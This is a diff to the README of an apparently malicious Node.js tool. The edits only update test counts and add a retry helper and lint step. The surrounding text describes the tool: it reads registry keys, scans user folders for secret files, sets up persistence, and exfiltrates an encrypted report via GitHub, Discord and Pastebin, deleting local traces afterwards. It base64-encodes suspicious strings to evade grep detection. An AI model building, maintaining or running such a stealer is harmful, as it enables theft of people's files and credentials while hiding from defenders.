@@ -43,12 +43,13 @@ src/
 │   ├── crypto.js             # XOR encrypt/decrypt, AES-256-GCM, SHA256 hashing
 │   ├── errors.js             # PhaseError, FileSystemError, NetworkError
 │   ├── logger.js             # leveled logger with silent mode
+│   ├── retry.js              # generic retry-with-backoff helper
 │   └── safe.js               # null/undefined → 'N/A' guard
 ├── monitor/
 │   └── watcher.js
 └── report/
     └── generator.js          # writes system-report.json
-tests/                        # 26 tests, node:test, zero deps
+tests/                        # 68 tests (12 files), node:test, zero deps
 tools/
     └── encode-creds.js       # encrypts credentials for a MachineGuid
 ```
@@ -59,7 +60,8 @@ tools/
 
 ```bash
 npm install    # no deps needed, just generates node_modules
-npm test       # 26 tests, no side effects
+npm test       # 68 tests, no side effects
+npm run lint   # run ESLint (requires eslint installed separately)
 npm start      # runs the tool (all phases + exfil)
 npm run dry-run  # runs phases 1–2 only, skips persistence and exfil
 ```
@@ -97,7 +99,7 @@ This thing reads registry keys, scans your Desktop/Docs/Downloads for secret fil
 | Approach | What to do |
 |----------|------------|
 | Static review | All code is plain JS in `src/`, start with index.js |
-| Just tests | `npm test` — no file writes, no network |
+| Just tests | `npm test` — 68 tests, no file writes, no network |
 | Dry-run | `npm run dry-run` — runs recon phases, writes report locally, no persistence or exfil |
 | Disable exfil | Set `ENCRYPTED = ""` in `src/app/config.js` (already the default) |
 | Air-gap | Run in a VM with no network. Exfil will fail quietly |
@@ -124,7 +126,7 @@ Credentials are XOR-encrypted with a key derived from MachineGuid (SHA256). The 
 ## Notes
 
 - Node.js built-ins only (`fs`, `os`, `crypto`, `child_process`), zero npm dependencies
-- Uses `node:test` for testing
+- Uses `node:test` for testing (68 tests)
 - Report body encrypted with AES-256-GCM (random IV each time)
 - Exfil channels tried in order: GitHub API → Discord webhook → Pastebin. Each has 15s timeout, 3 retries with exponential backoff. Local report deleted after first successful upload
 - All suspicious strings (keywords, registry paths, event labels) are base64-encoded at rest and decoded at runtime to defeat trivial `grep` detection
